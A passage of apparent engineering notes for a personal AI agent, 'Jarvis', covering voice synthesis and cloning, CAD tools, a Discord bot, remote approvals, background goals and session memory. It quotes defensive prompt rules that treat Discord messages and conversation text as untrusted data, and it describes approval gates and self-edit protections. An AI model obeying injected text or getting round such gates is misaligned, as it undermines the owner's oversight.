  turn completes**, in order, exactly as before. A sentence spoken early is a
  sentence a later tool call can contradict. So this is a *cache keyed on the
  chunk text* — a guess that does not match the finished reply is thrown away
  and resynthesized, and being wrong costs CPU rather than correctness.

  But wrong is not free, and that shapes the whole thing: **local Kokoro
  serializes on one model instance** (`_kokoro_lock` — which is also why the
  "two in flight" pool only ever measured 1.24x, not 2x), so a wasted
  synthesis holds the lock the chunk actually being waited on needs. Hence
  `_stable_chunks()`, which declares a chunk settled only once the one after
  it exists *and* is too long to be merged back into it; hence
  `SPECULATION_LIMIT`; and hence the reset on **`interim_text`**, which is the
  loop's existing signal that a step ended in a tool call and everything
  streamed so far was thinking out loud rather than the answer.

  `feed()` guards its **whole body**, not just the synthesis: it runs inside
  `llm.chat`'s streaming loop by way of `on_delta`, so anything raised there
  comes out of the middle of the model call. The first version guarded only
  "the part I thought could fail", which is not the same promise — the test
  caught it.

- **Chunk boundaries are deliberate now** (`voice._repad`). Each Kokoro chunk
  carried ~30ms of lead-in and ~85-105ms of tail, and back-to-back scheduling
  turns that padding *into* the pause between sentences — the same pause
  whether the boundary fell between two sentences or in the middle of one.
  Since the clamp splits a long opener mid-phrase routinely, that read as a
  stumble. The pad is trimmed and put back sized by what the chunk ends on:
  130ms after a full stop, 70ms after a clause, 15ms after a bare word cut. A
  margin is kept at both ends so a plosive's attack and a final decay survive,
  and a chunk that never rises above the floor is returned untouched — a quiet
  chunk is recoverable, an empty one is a dropped sentence.

Still cloud, still one shot: **STT is unchanged.** `voice.stt()` sends the
whole utterance to parakeet when it closes. Streaming/incremental
transcription would need a websocket endpoint OpenRouter's transcription API
does not offer, and is the next thing to look at if the remaining latency
matters.

**The owner can mute themselves (2026-08-20).** An always-open mic needs an
off switch the owner controls: the **MIC row** in SYSTEMS (beside WAKE WORD;
VOICE OUT remains his output mute). It is HUD-local by design — capture,
segmentation and wake all live in `jarvis.html`, so there is no server state
and **no tool**: an agent that could deafen its own input channel is a lever
Jarvis must not hold, and with the mic off, "jarvis, unmute" could never be
heard anyway — unmute is a click. Strict semantics, each one a deliberate
choice: nothing is ever claimed or uploaded while muted; the **wake
recognizer is stopped outright** (it streams audio to Google's speech
service — a muted mic must stop that too, so the recognizer is re-armed from
`wakeMode` on unmute and `setWake` while muted only records intent); the orb
**still interrupts** him but records nothing (mute must not take away the way
to shut him up); the ring keeps filling *locally* so the room threshold is
current at unmute; the orb's level meter reads zero (a level meter on a muted
mic promises listening); the hint says MIC MUTED · TYPE · OR UNMUTE IN
SYSTEMS, since every other hint is an invitation to speak; the state persists
in localStorage and **fails toward muted** across a reboot (a window that
restarts into a hot mic is the wrong surprise — the same reasoning as the
wake toggle, in the opposite direction); and `sendUtterance` clamps every
upload at the last unmute mark, because the wake path back-dates an
utterance's start by WAKE_GRACE + PREROLL and across an unmute that would
ship audio recorded while the owner believed the mic was off. Typed input is
untouched — muting the mic and typing is the point. Covered by the mic-mute
section of `tests/face/hud_capture_check.py`.

**Pocket TTS shipped (2026-08-20) — a second local voice backend, with
cloned and hybrid voices** (`jarvis/pocket.py`; pinned synthetically by
`tests/voice_pocket_check.py`, live-smoked same day — findings at the end
of this section). Kyutai's pocket-tts is a 100M-param CPU TTS
with zero-shot cloning: ≤30s of someone speaking becomes a voice, and the
computed prompt state (the model's KV-cache) exports to a `.safetensors`
that reloads fast. Install: `uv pip install -e .[pocketvoice]` — it pulls
CPU PyTorch, the first heavyweight ML stack in the venv; use a CPU torch
index so a CUDA wheel doesn't ride along. Weights download from HF on first
use. The rules, in the order they matter:

- **The namespace is the router.** Pocket voices are `pocket:<name>`
  (`pocket:alba` builtin, `pocket:dad` clone/hybrid); bare names stay
  Kokoro's, so avatars and config needed no migration. The prefix is applied
  and stripped only in `voice.py` — `pocket.py` deals in bare names — and
  `tts()` routes per resolved voice, so the face pre-warm, `/say`, Discord
  and the speculator all needed zero changes. Pocket serializes on its own
  `_lock` beside `_kokoro_lock` (never nested; the fallback runs outside it).
- **The cloud never sees a `pocket:` name.** Any pocket failure — raising
  model, missing store entry, library absent — warns once and degrades to
  `config.TTS_VOICE` on the existing Kokoro→cloud chain; if the configured
  default is itself `pocket:`, it degrades to `bm_george` so the fallback
  cannot loop. This preserves both standing invariants: every path leaves
  him audible, and the cloud only receives names it can synthesize. Speed is
  ignored on pocket (no such control) with a once-per-process note.
- **`voice.catalog()` is the one list** — Kokoro bundle + pocket builtins +
  the custom store, each `{name, backend, kind}`; `set_voice`/`voice_for`
  validate against it. `available_voices()` stays Kokoro-only on purpose
  (tests and the language map key off the bundle). `pocket.available()`
  answers without importing torch (`sys.modules` first — which is also what
  lets the test fake work — then `find_spec`), so `import jarvis.voice`
  never drags the ML stack in.
- **Creating a voice is the owner's act, never the agent's.** `jarvis voice
  clone <name> <audio…>` and `jarvis voice mix <name> a=0.6 b=0.4` are CLI
  subcommands (the `jarvis auth` pattern) with a consent confirmation —
  the pocket-tts license prohibits cloning without the speaker's lawful
  consent, so there is no clone tool and no HUD upload. `jarvis voice
  list|say|rename|rm` complete the set; `say` writes a WAV and plays it via
  paplay/aplay when it can. The store is `config.VOICES_DIR`
  (`JARVIS_VOICES`, default `~/.local/share/jarvis/voices/<name>/` —
  voice.json + state.safetensors + the reference audio), **outside the repo
  like sessions and never committed**: clones are audio of real people.
  `.gitignore` carries a `voices/` backstop anyway. Directories are built
  aside and renamed into place so a crashed clone never leaves a half-voice.
- **Hybrids are experimental, and fail loudly.** pocket-tts has no native
  mixing, so `mix` blends the *exported* states per tensor (weights
  normalized; shapes differing in exactly one axis — the prompt-length one —
  slice to the shortest keeping the head, so positions stay aligned;
  anything stranger is a ValueError). `_blend` is written with plain
  operators so the free suite runs it on numpy while production runs torch.
  Judged by ear via `jarvis voice say`; the documented fallback for a bad
  blend is a multi-file clone, which concatenates reference audio instead.
- **The HUD picker now spans backends.** `/voices` returns grouped entries
  plus `override`; the picker's first row is AVATAR DEFAULT (`POST /voice`
  with `""` clears `_voice_override` — the picker used to outrank every
  avatar forever with no way back), and rows carry KOKORO / POCKET / CLONE /
  HYBRID badges. Still `textContent`-built, still same-origin.

Live smoke findings (2026-08-20, pocket-tts 2.1.0, torch 2.13.0+cpu via
`UV_TORCH_BACKEND=cpu` — the resolver did land a clean CPU wheel on 3.14):

- **The probe answered every unknown the right way.** sample_rate is 24000
  (never assumed); output floats sit in [-1, 1] so `_repad`'s 0.01 floor
  applies unchanged; generation ran 780–1871ms per chunk on this CPU —
  under the face's 2500ms SLOW threshold for ordinary sentences; and
  `generate_audio` does **not** mutate the state it is passed (exported
  before/after, byte-identical), so `_state` needs no defensive clone.
- **The exported state is small and fixed-shape**: 12 tensors — per-layer
  `self_attn/cache` float32 `(2, 1, 126, 16, 64)` plus an int64 `offset` —
  and the cache capacity is fixed at 126, so two voices' states are
  *shape-identical* and `_blend`'s one-axis slicing is a safety net rather
  than the common path. The int64 offsets do differ per prompt, which is
  why `_blend` takes the elementwise **minimum** for integer tensors: a
  blended position only counts as valid if it is valid in every component,
  and "first wins" would have made the mix order-dependent.
- **Mixing works on real tensors**: `jarvis voice mix smoke-blend alba=0.5
  marius=0.5` wrote a hybrid whose state loads through the normal store
  path and synthesizes real speech (4.0s for the standard test line)
  through the full `voice.tts()` routing and the HUD-facing surfaces.
  Whether it *sounds* like a plausible blend is the owner's ear-call —
  A/B WAVs were handed over; `smoke-blend` is left in the store to audition
  from the picker (`jarvis voice rm smoke-blend` when done).
- **The `BUILTINS` list is exactly the library's catalog** — the failure
  message below printed all 26, matching name for name.
- **A quiet reference clones into a quiet voice** (found on the owner's
  first real clone, 2026-08-21): the model carries the prompt's loudness
  into everything it synthesizes — a peak-0.09 laptop-mic take produced
  output ~7x quieter than the builtins. `pocket.clone` therefore
  normalizes decodable reference audio to a healthy speech level
  (`_REF_RMS` with a `_REF_PEAK` clipping ceiling) before prompting;
  measured fix: output rms 0.0125 → 0.0746, in line with builtins. Files
  the stdlib cannot decode (mp3 and friends) still pass through at their
  recorded level.
- **Voice cloning is gated upstream — resolved 2026-08-20.** The
  cloning-capable weights require accepting the terms at
  huggingface.co/kyutai/pocket-tts and a local `hf auth login` (the venv's
  own `.venv/bin/hf`, no apt install); without them, builtins and *mixes of
  builtins* work fine, a clone attempt fails with the library's own clear
  message, and the build-aside store logic leaves no half-voice behind
  (verified — that failure path ran for real). The owner accepted the terms
  and logged in same day; cloning was then validated live: clone → speak,
  2.6s of valid WAV — **with `HF_HUB_OFFLINE=1` for the whole run**, which
  is the proof the privacy pins below rest on.

**The privacy pins (2026-08-20, owner's ask: reference audio and cloned
states must never share a connection with the internet).** They never could
— there is no upload path anywhere in pocket-tts or Jarvis, and the only
network use is *downloading* weights — but two pins remove even the
metadata residue and harden the at-rest story:

- **Jarvis processes default to HF offline** (`config.py`, right after
  `_load_dotenv`): `HF_HUB_OFFLINE=1` unless `JARVIS_HF_OFFLINE=0`, set
  before anything can import `huggingface_hub` (config is every
  entrypoint's first import; both TTS backends load lazily). This kills the
  hub client's version-check requests and download telemetry, so synthesis
  and cloning provably touch no network at all. It holds because
  **everything is prefetched**: both model variants (the gated cloning one
  and the fallback) and all 26 builtin voice states are in
  ~/.cache/huggingface. The cost, documented in the comment: anything
  needing a *fresh* Hub fetch — a pocket-tts upgrade, a new machine, a
  swecompare dataset refresh — needs `JARVIS_HF_OFFLINE=0` for that one
  run. An explicit `HF_HUB_OFFLINE` in the environment always wins.
- **The voice store is owner-only** (`pocket._store_root`): 0700 on the
  root and every voice directory (mkdtemp is 0700 by construction and
  `os.replace` keeps the mode) — a cloned voice is reference audio of a
  real person plus the state to speak as them, which is
  credential-adjacent, so it gets the token-file treatment.

  Both pins are in `tests/voice_pocket_check.py` (`hardening_checks`:
  fresh-subprocess env matrix for the offline default and its two
  overrides, and the 0700 modes).

**Onshape CAD shipped (2026-07-31), live validation pending.** The second
use-but-never-see integration (see Safety design). `jarvis auth onshape`
pastes API keys created under My account → Developer → API keys (Basic
auth on the wire — no HMAC needed for first-party use; individual accounts
are capped at 2 active keys), then creates or adopts the one sandbox
document Jarvis may write to and records read-only parts-library documents.
`tools/onshape.py`: cad_status / cad_find_part / cad_create_assembly /
cad_insert / cad_assembly / cad_move / cad_delete / cad_render (shaded PNG
via ToolResult.image_b64 — the model's eyes; text readback in inches is
ground truth). API facts verified against the docs, worth keeping:
cross-document inserts must reference a *version* of the source document,
so cad_find_part resolves each library's latest version and errors usefully
on never-versioned docs; insert-with-placement is a single call
(`transformedinstances`: 16-float row-major matrix, meters, absolute in
root-assembly coords); `shadedviews` requires a 12-float view matrix — it
*rejects* named views despite what the generated client docs say, so
cad_render carries a `_VIEWS` name→matrix table — and `pixelSize=0` means
zoom-to-fit; `occurrencetransforms` takes the flat
`{occurrences, transform, isRelative}` body (the `transformDefinitions`
wrapper belongs to `/modify` and 400s). The tools speak inches/degrees
(VEX lives on a 1/2" grid) and convert internally.

**Validated live 2026-07-31** on the owner's account: sandbox created
(public — free plan), and the 14 official VEX V5 library documents
auto-discovered and written into the bundle via the documents-search API
(`q='description:"Official VEX V5 Library"'`, `filter=4` = public, then
keep only owner == "Onshape" — a name search surfaces user copies first
and misses the real ones, which are matched by *description*). Full
pipeline exercised tool-by-tool: find "c-channel" across 14 libraries →
create assembly → insert two 35-hole aluminum c-channels → readback →
move → iso/top renders. The renders earned their keep immediately: a 12"
Y-offset overlapped the 17.5"-long rails (channels run lengthwise along Y
in their local frame), which the readback stated and the render made
obvious; one cad_move fixed it. Still to build: mates via mate
connectors, configurable cut-to-length (the "(Configurable)" library
docs), and whiteboard→CAD wiring. API-key note: keys live under My
account → Developer → API keys (the dev-portal URL is OAuth-apps only
now); individual accounts cap at 2 active keys.

**CAD improvement round 1 shipped (2026-08-05)** — items 1–3 of
`docs/cad-improvement-plan.md`; mates (item 4) deliberately wait until the
bench has measured whether 1–3 absorbed the failure.

- **cad-bench** (`jarvis/cadbench.py`, `jarvis bench --family cad`) — the
  fourth family. Five tasks (place / pair / frame / revise / repair) graded
  the agent-bench way: the assembly is read back from Onshape afterwards and
  scored on instance count, positions, rotations, and clearances computed
  from real part bounding boxes — never the prose. Categories: placement,
  clearance, revision, discipline. Each run builds its own
  `cadbench-<task>-<runid>` assembly in the pinned sandbox and deletes it in
  a `finally:` (a failed cleanup prints the assembly name loudly). The write
  pin is untouched. Costs OpenRouter *and* Onshape quota — the graders make
  API calls too. `pair` is the recorded c-channel regression (a stated gap
  that requires knowing the part is 17.5" long); `revise`/`repair` are the
  tasks predicted to discriminate until mates exist.
  `JARVIS_CADBENCH_TRACE=1` keeps each task's full call sequence and
  transcript under /tmp. Cleanup is verified live: deleting the assembly
  cascades to the BOM element Onshape auto-creates beside it, so a bench
  sweep leaves the sandbox exactly as it found it.

  **Baseline (Luna, 2026-08-05/06):** place ✓ · pair ✓ · frame ✓ ·
  revise ✓ · repair ✗ (2/11, hit the 18-step cap) — 83% overall, $0.0076,
  130s. **The readback upgrade absorbed most of the predicted failure**:
  `pair` — the recorded 12-inch c-channel regression — passed because the
  model computed the gap from the new extents. The `repair` failure did
  not reproduce: an immediate re-run passed 11/11 in 10.7s with the
  textbook sequence (status → readback → one absolute cad_move restating
  position with zeroed rotation → readback → render). Same lesson as
  agent-bench: a single run is a sample, not a verdict. Consequence for
  item 4 (mates): the ladder as it stands no longer demands them — build
  them when a real task does, or when the bench gains a task where a
  moved rail must carry attached parts (which is what mates actually
  solve).
- **Readback fidelity** (`tools/onshape.py`): `cad_assembly` now reports
  actual rotation via `_angles()` — the exact inverse of `_rotation`, same
  fixed-frame X→Y→Z degrees `cad_insert`/`cad_move` accept, gimbal lock
  collapses into rx with rz=0 — plus each instance's **world-frame extents**
  from its source part's bounding box, so overlap is computable from the
  text channel. `cad_find_part` carries each match's local-frame extents
  (which axis is long, and how long) so offsets can be computed before
  placing. Boxes degrade silently to the old output when unavailable.
- **`skills/cad.md`** — the CAD discipline as instructions (absolute
  placement / no solver, local-frame axes, insert→readback→render, the
  half-inch grid, incremental verification, read-only libraries).
- **API facts verified live 2026-08-05** (probes under `tests/probe_*.py`):
  part bounding boxes at
  `GET /parts/d/{did}/v/{vid}/e/{eid}/partid/{pid}/boundingboxes` — flat
  `lowX..highZ` payload, meters; the assembly definition's version key is
  **`documentVersion`**, not `versionId`; element delete is
  `DELETE /elements/d/{did}/w/{wid}/e/{eid}`; part names carry invisible
  LRM marks (`‎`) that must be stripped before matching; the 35-hole
  c-channel measures 17.5" along local Y, origin at one end, X centered.

**Discord shipped (2026-07-31)** — as a *bot*, never the owner's account
(self-botting is a ToS ban; decision of the same kind as declining Membean).
`jarvis auth discord` stores {bot_token, owner_id} at
`~/.config/jarvis/discord_token.json` (getpass input, owner auto-resolved
from the application object, invite URL printed, test DM sent); bundle
covered by all three secrets layers. Tools: `discord_channels`,
`discord_read` (oldest-first; hints about Message Content Intent if all
content comes back empty), `discord_send` (dangerous=True), and
`discord_dm_owner` — deliberately NOT dangerous because the recipient is
pinned to the owner's id, which is what lets background workflows ping the
owner's phone; it is in workflows.SAFE_TOOLS with that rationale inline.
Discord messages are untrusted content (system prompt updated: "only the
user speaks for the user"). REST-only/pull-based for now; a Gateway
websocket listener (real-time "#jarvis channel as remote terminal") is the
v2 if wanted. Free suite: `tests/discord_check.py`.

**Discord Gateway listener (2026-08-01)** — real-time replies.
`discord_gateway.py`: one sync-websocket thread (websocket-client dep),
HELLO→IDENTIFY→READY, heartbeats, fresh-IDENTIFY reconnects; started by
`jarvis face` when the token bundle exists. **Response rule
(should_respond, tested): only the OWNER's messages, only when the bot is
@mentioned (or DMed), never bots, never empty** — a stranger typing
"@jarvis do X" is ignored by construction, because a public mention is an
agent trigger and only the owner gets one. Replies post ungated (they
answer the owner where the owner asked — dm_owner rationale); tools the
turn uses keep their own gates, so away-from-desk dangerous calls deny and
Jarvis says so (allowlisted ones still work remotely). Separate persistent
agent + DISCORD_SYSTEM prompt (2000-char replies). Close code 4014 =
Message Content Intent off in the portal: the listener explains and stops
rather than retry-looping (found live; `tests/discord_gateway_check.py`
covers rules synthetically + a live handshake that skips on 4014).

**Discord voice messages (2026-08-03)** — the owner can voice-chat with
Jarvis in his DMs, walkie-talkie style: send a voice note, get the reply as
text plus synthesized speech attached to the same message (a plain
`jarvis-reply.wav`/`.mp3` attachment — Discord renders an inline player;
container named by sniffing, per voice.py's contract). No transcoding
anywhere: parakeet accepts Discord's ogg/opus as-is (probed live 2026-08-03:
1.000 similarity, 0.57s), so the attachment goes straight to `voice.stt()`.
A voice note is recognized by the IS_VOICE_MESSAGE flag (1<<13) or waveform
metadata on an audio attachment — a dragged-in mp3 has neither and is never
transcribed as if spoken. The trigger rule is unchanged in effect: a voice
note cannot carry an @mention, so voice only works in DMs, owner-only as
always. **The safety line: a transcription can never resolve an
authorization.** The gateway passes `spoken=True` to `run_turn`, and
`_discord_turn` skips `DISCORD_APPROVALS.handle_reply` for spoken turns — a
mishearing must not become a "yes", so approval replies stay typed-only.
Spoken turns reach the agent prefixed `[voice note]` (the prompt explains:
expect mishearings, reply speakably). Every voice-path failure (oversize >8MB,
download, STT) becomes a text reply and a TTS failure degrades to text-only —
never a silent drop. All of it covered in `tests/discord_gateway_check.py`
(voice rules, the stubbed pipeline, failure degradation, and the
approval-isolation check against the real face server); the multipart
attachment upload was validated live against the owner's real DM.

**`jarvis daemon` shipped (2026-08-03) — away-agent phase 1** (the plan:
`docs/away-agent-roadmap.md`; the Discord core moved to `discord_agent.py`
so face and daemon share one implementation of the spoken-turns-never-
authorize rule). The daemon is the always-on half of the face with the
window cut away: Discord gateway + an ApprovalBroker whose `viewers` is
pinned to 0, so every dangerous-tool question DMs the owner or denies
`nowhere-to-ask`. No HUD, no workshop, no browser window, no TTS pre-warm
(voice notes load Kokoro lazily). **Exactly one process owns the gateway:**
the daemon refuses to start while a face is serving (double-IDENTIFY would
double every reply), and a face started while the daemon runs skips the
gateway AND calls `APPROVALS.detach_remote()` — DM answers land in the
*daemon's* broker, so a face-made DM could only ever time out; its
questions stay on the card, correct for the at-the-desk surface. The
read-only `/status` endpoint on `DAEMON_PORT` (8405) is both the
single-instance lock and how the face detects the daemon. Provisioning is
human-only: `jarvis daemon install` prints the systemd user unit
(`WorkingDirectory=%h` — tool-relative paths must not resolve against `/`),
the `loginctl enable-linger` step, and the WSL keepalive options (Task
Scheduler `wsl --exec sleep infinity`, or `.wslconfig` `vmIdleTimeout=-1`);
it writes nothing. `tests/daemon_check.py` is the free suite (responder
approval isolation, nowhere-to-ask/timeout/detach denial paths, health
lock + single instance, refusing to start over a face, shutdown releasing
blocked waiters). Still pending from phase 1's exit gate: the 72-hour soak
under systemd with real sleep/wake cycles.

**Background goals shipped (2026-08-03) — away-agent phase 2.** A goal is a
loop of turns, not a turn: `goals.py` is the durable store
(`~/.local/share/jarvis/goals/<id>/` — `goal.json` plus an append-only
`journal.jsonl` written by the *runner*, never the model, so "what did you
do while I was gone" is answered from disk), and `goalrunner.py` is one
serial worker thread — one goal at a time on purpose (singleton browser,
predictable spend) — running slices of `run_turn` on the goal's own
session, which is what makes daemon-restart resume free. Between slices it
checks shutdown, cancel, then ceilings (dollars / hours / slices, defaults
in config, per-goal overrides on `jarvis goal`); any ceiling parks the goal
with a DM saying what was spent. **Ending is a tool call**: the goal agent
carries `goal_report(done|blocked)` (`tools/goalctl.py`, armed only inside
a slice — the step-budget lesson: state outside the transcript gets
confabulated, so completion must be an act *in* it). **Steering is barge-in
for goals**: a `steer:` DM queues text, sets the interrupt Event behind the
agent's `should_stop` (turn ends whole at the next step boundary, invariant
3), and the text arrives as the next slice's `[owner steering]` message.
Progress DMs: start, terminal states, and an interval digest
(`GOAL_UPDATE_MINUTES`, default 10) with slices/spend/elapsed/last
activity/the live plan slot — assembled from the runner's records, never
asked of the model. DM verbs (`goal: …`, `steer:`/`redirect:`,
`goal status`, `goal cancel`) are parsed in the daemon's `_route` ahead of
the conversation agent, **typed messages only** — a misheard voice note
must not steer or cancel, same isolation as approvals. Intake: `goal:` DM
or `jarvis goal "…" [--dollars --hours --slices]`; `jarvis goals` lists.
The goal toolset is the full registry minus desktop (foreground-stealing is
a desk feature) and window controls; the approver is the daemon broker's
remote gate, so dangerous calls DM the owner exactly as at the desk, and a
deny is handled by the model (park-and-continue and per-goal scopes are
phase 3). Free suite: `tests/goals_check.py`; `daemon_check` now pins
GOALS_DIR to a temp dir for the daemon's whole lifetime — a test daemon
must never pick up real queued goals with a stubbed approval channel.

**Goal protocol upgrades from the first live runs (2026-08-05), all
committed same-day:** slice 0 is **planning only** (plan DMed to the owner
before implementation; steer within a step); the first `goal_report(done)`
buys a **verification slice**, not the exit — and a verify slice that keeps
working instead of confirming **re-arms the gate**, because the first live
run reported done after phase 1 of 7 and the real completion must not sail
through on the spent pass. `goal_report` is documented as ENTIRE-goal-only.
`goal resume` requeues the newest parked goal, and `steer:` with nothing
running targets the newest parked/queued goal — parked requeues immediately
with the steering as its first resumed message (one DM unblocks and aims).
Live validation on a real 7-phase VEX strategy goal (11 slices, $0.42,
~35min, daemon killed and restarted mid-goal with clean session resume —
phase 2's exit gate): the verify pass caught real defects both times it ran
(a missed 8-point scoring rule; stale docs + malformed coordinates), the
model used plan_write throughout (PENDING #2 answered for goal runs),
delegated verification reads to run_subagent, and honestly blocked on data
the game db doesn't contain rather than inventing it. Lesson worth keeping:
**write acceptance criteria into the goal statement** — the first VEX run
produced a complete-looking skeleton in one slice because nothing pinned
what "done" meant; the surgical follow-up produced correct code.

**vercel-deploy skill (2026-08-01).** Build → verify locally in his own
browser → private GitHub repo (`gh repo create --private --source --push`)
→ **stop and ask the owner for the Vercel project name** (it decides
`<name>.vercel.app`) → preview deploy → owner approves the preview → only
then `--prod`, on a fresh yes. Exact commands are written into the skill
(including `--cwd`/`-C` flags instead of `cd`, and the nohup/pkill pattern
for the throwaway local server). Everything routes through run_command's
approval gate; repos are private unless the owner explicitly says public.

**Self-improvement, governed (2026-08-01).** `skills/self-improve.md` lets
Jarvis edit his own codebase when the owner asks: read CLAUDE.md first, git
checkpoint before/after, run the relevant free suites, never report success
past a red test, one change per request (no autonomous loops). The boundary
that makes it safe is mechanical, not prose: **write_file refuses
SELF_PROTECTED** (`tools/files.py`: secrets.py, files.py itself,
tools/__init__.py, approvals.py, permissions.py) — the layers that gate him
change only by the owner's hand or per-approved run_command.
`tests/self_improve_check.py` guards the guard.

**Desktop control shipped (2026-07-31)** — Jarvis can drive Windows apps.
`jarvis desktop setup` (human-only) builds a Windows-Python venv at
`C:\Users\johnw\.jarvis-bridge` and writes `run-bridge.cmd`; the owner
starts that, and `windows/bridge.py` **dials into** WSL on port 8404. It
dials out rather than listening because WSL2 forwards `localhost` from
Windows inward, so that direction needs no firewall exception and no address
discovery — the WSL gateway IP changes every boot. Tools mirror the browser's
discipline exactly: `desktop_open` / `desktop_snapshot` give a ref-tagged
accessibility tree, `desktop_click` / `desktop_type` / `desktop_key` act by
ref, `desktop_screenshot` is the vision channel. Confinement is the app
allowlist (see *Safety design*). Validated live on both registered apps:
Settings navigated by ref with readback, Claude Desktop read in full, and
`jarvis ask` completing a real question end-to-end (7 steps, $0.0010).

Five findings from getting there, each of which cost a debugging round:

- **Chromium/Electron publishes its tree over MSAA, not UIA.** Over UIA a
  Claude Desktop window bottoms out at an empty `DocumentControl` next to a
  "Chrome Legacy Window" stub; the same window over MSAA/IAccessible yields
  the entire UI. It *also* needs `--force-renderer-accessibility` at launch
  or the renderer tree stays off whichever API you ask with. Both halves are
  required. Claude is an MSIX/Store package, so the flag has to go through
  `IApplicationActivationManager::ActivateApplication` — the exe under
  WindowsApps is ACL'd and `explorer.exe shell:AppsFolder\…` silently drops
  arguments.
- **Chromium invalidates that MSAA root as it rebuilds its tree**, and the
  dead pointer does not raise — it reports zero children forever. Anything
  that polls has to re-fetch the root each time; `take_snapshot` also retries
  once on an empty result, because the failure mode is a *short* snapshot,
  not an error.
- **UWP suspends when it loses the foreground** and its tree collapses to
  nothing, so every read activates the window first. `SetForegroundWindow`
  alone is a silent no-op from a background process — it needs the
  `AttachThreadInput` dance — and believing it worked produced a screenshot
  of Settings that was actually a picture of Claude Desktop with Settings'
  ref badges drawn on it. Screenshots, synthetic keys, and coordinate clicks
  now hard-require a verified foreground; pattern-based reads and clicks do
  not need one.
- **"Has children" is not readiness.** A suspended UWP window still reports
  its frame children, so the first readiness check passed instantly and
  captured six lines of window chrome. Readiness now means a tree that
  clears a floor *and* stops changing. Relatedly, Settings is responsive and
  at a small width **removes** the nav list rather than reflowing it, so the
  window is maximized for a predictable tree — the desktop equivalent of
  pinning a browser viewport. And a UWP app is two windows: the
  ApplicationFrameWindow owns position and z-order while a
  `Windows.UI.Core.CoreWindow` owns the content, and Windows moves the
  second between nested and top-level *while the app runs* — so the window
  we activate and the window we read are resolved separately.
- **Snapshot wording changes answers.** Windows 11 switches are Buttons
  carrying TogglePattern, so reading toggle state only from checkboxes left
  every switch stateless and Jarvis answered "Bluetooth: off" about a radio
  that was on. Exposing it as `button "Bluetooth" checked=true` was still
  misread — "checked" on a button reads as "pressed". Rendering it as
  `switch "Bluetooth" ON` fixed the answer with no prompt change. Selection
  is now a separate word from checkedness, and only printed when true.

**Remote approval over Discord DM (2026-08-01).** A Discord-triggered turn
used to be read-only in practice: every dangerous tool denied for want of a
human at the HUD. Now the same one-shot request can be put to the owner in
their DMs — `discord_approvals.DiscordApprovals` is a *remote channel* the
broker holds (`ask(item) -> delivered?` / `close(id, resolution)`), so
`face/approvals.py` still knows nothing about Discord. The DM echoes the tool
and its full arguments plus a 4-character code; the owner replies **yes** /
**no** / **always** (always writes the persistent allowlist entry, same as the
card's ALWAYS button).

The rules, in the order they matter:

- **Only the owner is ever heard**: `should_respond()` drops everything else
  before this code runs. On top of that an answer counts only in the *same DM
  channel the question was asked in* — a "yes" typed in a server channel, even
  by the owner, authorizes nothing.
- **One-shot, per-request**: the code maps to a broker id that resolves
  exactly once. With two asks open, a bare "yes" is refused rather than
  guessed; an answered code is dead.
- **Anything that is not a clear answer denies**: the parser takes one word
  (plus an optional code), so "no wait actually yes" resolves nothing and gets
  asked again. Timeout is 10 minutes (vs the HUD's 120s — you have to get your
  phone out), and Discord being unreachable falls through to the old denial,
  now called `nowhere-to-ask`.
- **Who gets asked**: the Discord agent's approver is
  `APPROVALS.approver(remote=True)` — its owner is on a phone by definition —
  so its questions always DM, *and* still raise a card if a window is open
  (either surface can answer; first one wins). Face turns only DM if no window
  is connected, so sitting at the desk generates no DM traffic. Workflows are
  unchanged: still a deny-all approver, because nobody is watching them at
  all.
- The HUD card now carries the real deadline and says ALSO ASKED ON DISCORD,
  and a window closing no longer denies a question that went out remotely
  (`deny_all(..., include_remote=False)`) — the owner not being at the HUD is
  the whole premise.

**The trade, stated plainly:** approval used to require physical access to
this machine, and now it also accepts whoever holds the owner's Discord
account. That is the owner's deliberate call (asked for 2026-08-01), and it is
why the DM echoes the entire command rather than just naming the tool. Undoing
it is one constructor argument: drop `remote=` from the `ApprovalBroker` in
`face/server.py`.

**Session memory (2026-07-31).** Conversations now survive a restart, and
Jarvis can look into the ones before this one. `sessions.py` keeps three
things per session under `~/.local/share/jarvis/sessions/<id>/` — outside the
repo, unlike memory/ and skills/, because transcripts are bulk, personal, and
rewritten every turn:

- `messages.json` — the live transcript *as the context manager left it*, so
  resuming inherits the pruned history rather than re-inflating it. Live
  image payloads are swapped for the eviction placeholder on the way to disk
  (a screenshot is 1.5MB of base64 no future turn will look at), and
  `messages[0]` is never persisted — the system message is rebuilt on load, so
  a resumed conversation gets today's prompt and today's indexes.
- `log.jsonl` — append-only user/reply text. This is the durable record:
  compaction *deletes* from the transcript, and the log still has it. It is
  what `session_search` greps and what a summary is built from.
- `meta.json` — title, timestamps, turns, cost, and the cached summary.

`Agent(session=…)` is the whole integration: it restores on construction and
calls `session.record()` after every `run_turn`, so all three surfaces persist
for free (a save that fails is caught — persistence must never break a turn).
A **cancelled turn is saved too**: the transcript really does end at that user
message, which is what makes an interrupted conversation immediately
reusable.

Cross-session recall follows the skills two-tier design: recent session
**titles** are rebuilt into `messages[0]` every turn (only for agents armed
with `session_summary` — same rule as skills), and the content of one loads
only when Jarvis calls a tool. `session_summary` is the "inject that
conversation" path — its result lands in the transcript as a tool message,
which is what injection *is* in a chat loop; the summary is cheap-tier,
generated on demand and cached until the session gains a turn.
`session_search` greps every log, `session_read` returns exact wording. All
four are read-only, none is dangerous, and all four are in
`workflows.SAFE_TOOLS`.

Decisions worth not relitigating:

- **New session by default, resume explicitly** (`jarvis chat -c` / `-r <id>`,
  `jarvis face -c`, or the SESSION row in the HUD). Silently resuming is how
  you end up talking into a transcript you have forgotten. Discord is the one
  exception — it continues its own last session, because it is the
  away-from-desk channel with no UI out there to pick one.
- **Jarvis can read sessions but not switch them.** Which conversation is live
  is the owner's choice; a tool that swapped the transcript mid-turn would
  also have to decide where its own tool result belongs.
- **A session with nothing said in it never touches disk** (`sessions.new()`
  builds the object; `record()` creates the files). Every chat invocation and
  every window launch mints one, and empty directories would flood the index
  and the picker with conversations that never happened.
- **The titler and summarizer wrap their input in delimiters and label it
  data.** A conversation is full of imperatives, and the first version of the
  title prompt produced the title "Acknowledged" — the cheap tier answered the
  message instead of describing it. Related: gpt-oss-20b is a reasoning model
  and returns *empty content* if the token budget is spent thinking, so a
  6-word title needs `max_tokens=200`, not 24.

Verified live: two CLI turns across a restart (`-c` recalled a codeword from
the saved transcript), and a third, fresh session that answered "what codeword
did I give you earlier" by calling `session_search` off the injected index and
citing both session ids.

**Long-horizon work, part 1 (2026-08-01).** Three changes aimed at the same
failure — a run that goes long enough to forget what it was doing.

- **The cut-point orphan bug** (invariant 1) — found by inspection, reproduced,
